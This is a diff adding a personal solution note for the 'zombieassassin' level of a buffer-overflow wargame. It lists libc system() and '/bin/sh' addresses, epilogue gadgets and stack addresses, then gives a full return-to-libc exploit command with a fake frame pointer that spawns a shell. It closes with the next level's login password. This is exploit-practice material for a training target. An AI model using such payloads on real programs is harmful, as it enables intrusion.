@@ -1,0 +1,41 @@
+* zombieassassin is using shared lib.
+
+<address of system>
+
+	0x40058ae0
+
+</address of system>
+
+<address of "/bin/sh">
+
+	0x400fbff9
+
+</address of "/bin/sh">
+
+<address of apilogue of main>
+
+	leave: 0x80484df
+	ret: 0x80484e0
+
+</address of apilogue of main>
+
+<ebp, ret, buffer>
+	
+	ebp: 0xbffffae8
+	ret: 0xbffffaec
+	buffer: 
+	
+</ebp, ret, beyond>
+
+<command>
+
+	./zombieassassin "$(for x in `seq 1 16`; do printf "\x90"; done)$(printf "\xe0\x8a\x05\x40")aaaa$(printf "\xf9\xbf\x0f\x40")$(for x in `seq 1 12`; do printf "\x90"; done)$(printf "\xcc\xfa\xff\xbf")$(printf "\xdf\x84\x04\x08")"
+
+</command>
+
+<next>
+
+	id: zombieassassin
+	pw: no place to hide
+
+</next>
